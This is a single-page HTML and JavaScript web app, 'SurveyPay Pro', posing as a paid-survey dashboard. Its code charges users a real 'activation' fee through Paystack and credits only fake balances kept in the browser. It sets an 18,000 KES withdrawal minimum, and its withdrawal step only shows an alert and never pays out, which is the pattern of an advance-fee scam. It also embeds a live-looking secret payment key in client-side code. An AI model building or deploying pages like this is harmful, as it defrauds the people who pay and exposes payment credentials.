<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>SurveyPay Pro | Ultimate Dashboard</title>
    <script src="https://cdn.tailwindcss.com"></script>
    <script src="https://js.paystack.co/v1/inline.js"></script>
    <style>
        body { background: #080a0f; color: #fff; font-family: 'Inter', sans-serif; }
        .glass { background: rgba(20, 25, 35, 0.7); backdrop-filter: blur(15px); border: 1px solid rgba(255,255,255,0.1); }
        .gradient-gold { background: linear-gradient(to right, #fbbf24, #d97706); -webkit-background-clip: text; -webkit-text-fill-color: transparent; }
    </style>
</head>
<body class="max-w-md mx-auto min-h-screen pb-20 p-4">

    <div id="screen-login" class="min-h-screen flex flex-col justify-center items-center">
        <h1 class="text-5xl font-black text-transparent bg-clip-text bg-gradient-to-r from-cyan-400 to-blue-500 mb-2">SurveyPay</h1>
        <p class="text-slate-400 mb-8">Join the premium network</p>
        <div class="w-full space-y-4">
            <input type="text" id="reg-user" placeholder="Username" class="w-full bg-slate-900 border border-slate-700 p-4 rounded-xl">
            <select id="reg-currency" class="w-full bg-slate-900 border border-slate-700 p-4 rounded-xl text-white">
                <option value="KES">Kenya (KES)</option>
                <option value="USD">USA (USD)</option>
                <option value="EUR">Europe (EUR)</option>
            </select>
            <button onclick="register()" class="w-full py-4 bg-emerald-600 rounded-xl font-bold hover:bg-emerald-500">CREATE ACCOUNT</button>
        </div>
    </div>

    <div id="screen-app" class="hidden space-y-6 pt-6">
        <div class="flex justify-between items-center">
            <h2 class="text-pink-400 font-bold text-xl">Welcome, <span id="user-display" class="text-white"></span></h2>
            <div id="status-badge" class="px-3 py-1 bg-red-900/50 text-red-400 rounded-full text-xs font-bold">LOCKED</div>
        </div>

        <div class="glass p-6 rounded-3xl text-center border border-cyan-500/30">
            <p class="text-yellow-400 text-sm font-bold uppercase tracking-widest">Current Balance</p>
            <h1 id="bal-disp" class="text-5xl font-black gradient-gold mt-2">0.00</h1>
            <p id="min-withdraw" class="text-xs text-slate-500 mt-2">Min. Withdrawal: 18,000 KES</p>
            <button id="btn-activate" onclick="activateAccount()" class="mt-4 w-full py-3 bg-gradient-to-r from-blue-600 to-cyan-600 rounded-xl font-bold">ACTIVATE ACCOUNT</button>
        </div>

        <h3 class="text-purple-400 font-bold uppercase text-sm">Available Tasks</h3>
        <div id="survey-list" class="space-y-3 opacity-50 pointer-events-none">
            <div class="glass p-4 rounded-xl flex justify-between items-center cursor-pointer hover:border-cyan-500" onclick="completeTask(5.00)">
                <span class="text-blue-300 font-bold">Market Research</span>
                <span class="text-emerald-400 font-bold">+$5.00</span>
            </div>
            <div class="glass p-4 rounded-xl flex justify-between items-center cursor-pointer hover:border-cyan-500" onclick="completeTask(10.00)">
                <span class="text-blue-300 font-bold">App Review</span>
                <span class="text-emerald-400 font-bold">+$10.00</span>
            </div>
        </div>

        <button onclick="withdraw()" class="w-full py-4 bg-orange-600 rounded-xl font-bold text-white mt-8 hover:bg-orange-500">WITHDRAW FUNDS</button>
    </div>

    <script>
        // CONFIG - Replace these with your actual keys
        const PUBLIC_KEY = "pk_live_ebbc4bdc1da0f8fc075bae6ce78da4f9c89552bc";
        const SECRET_KEY = "sk_live_88e31b65b6c16121f6eea02fec2282cb6ddf067f"; // NOTE: Ensure this is kept secure if deploying publicly
        
        const RATES = { KES: 1, USD: 0.0077, EUR: 0.0071 };
        
        // Initial setup
        function register() {
            const user = document.getElementById('reg-user').value;
            const curr = document.getElementById('reg-currency').value;
            localStorage.setItem('user', user);
            localStorage.setItem('currency', curr);
            localStorage.setItem('balance', 0);
            location.reload();
        }

        function initApp() {
            if(!localStorage.getItem('user')) return;
            document.getElementById('screen-login').classList.add('hidden');
            document.getElementById('screen-app').classList.remove('hidden');
            document.getElementById('user-display').innerText = localStorage.getItem('user');
            
            const curr = localStorage.getItem('currency');
            const bal = parseFloat(localStorage.getItem('balance') || 0);
            const minW = (18000 * RATES[curr]).toFixed(2);
            
            document.getElementById('bal-disp').innerText = `${bal.toFixed(2)} ${curr}`;
            document.getElementById('min-withdraw').innerText = `Min. Withdrawal: ${minW} ${curr}`;
            
            if(localStorage.getItem('activated') === 'true') {
                document.getElementById('status-badge').innerText = "ACTIVE";
                document.getElementById('status-badge').className = "px-3 py-1 bg-emerald-900/50 text-emerald-400 rounded-full text-xs font-bold";
                document.getElementById('btn-activate').classList.add('hidden');
                document.getElementById('survey-list').className = "space-y-3";
            }
        }

        function completeTask(amount) {
            let currentBal = parseFloat(localStorage.getItem('balance'));
            let curr = localStorage.getItem('currency');
            let conversion = (amount * RATES[curr]);
            localStorage.setItem('balance', currentBal + conversion);
            alert("Task Complete! Earned " + conversion.toFixed(2) + " " + curr);
            location.reload();
        }

        function activateAccount() {
            const curr = localStorage.getItem('currency');
            const amount = Math.round(180 * RATES[curr] * 100); 
            PaystackPop.setup({
                key: PUBLIC_KEY,
                email: 'user@surveypay.com',
                amount: amount,
                currency: curr,
                callback: (res) => {
                    localStorage.setItem('activated', 'true');
                    alert("Account Activated!");
                    location.reload();
                }
            }).openIframe();
        }

        function withdraw() {
            if(localStorage.getItem('activated') !== 'true') return alert("Activate first!");
            const curr = localStorage.getItem('currency');
            const bal = parseFloat(localStorage.getItem('balance'));
            const min = 18000 * RATES[curr];
            
            if(bal < min) return alert("Minimum withdrawal is " + min.toFixed(2) + " " + curr);
            
            const method = prompt("Choose Withdrawal Method: M-Pesa, PayPal, Bank");
            if(method) alert("Withdrawal request of " + bal.toFixed(2) + " " + curr + " via " + method + " sent for processing.");
        }

        initApp();
    </script>
</body>
</html>
